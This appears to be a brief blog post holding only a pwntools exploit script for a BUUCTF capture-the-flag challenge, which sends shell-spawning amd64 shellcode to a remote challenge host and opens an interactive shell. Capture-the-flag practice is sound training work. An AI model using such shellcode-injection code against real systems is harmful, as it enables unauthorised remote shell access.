+++
title = "exp"
date = "2026-03-04"
type = "post"
categories = ['BUU']
tags = ['BUU']
draft = false
+++
```python
from pwn import *  
context(arch='amd64', os='linux', log_level='debug')  
  
io = connect('node5.buuoj.cn',29531)  
io.recvuntil(b"Show me your magic!")  
shellcode = asm(shellcraft.sh())  
payload = shellcode  
io.sendline(payload)  
io.interactive()
```
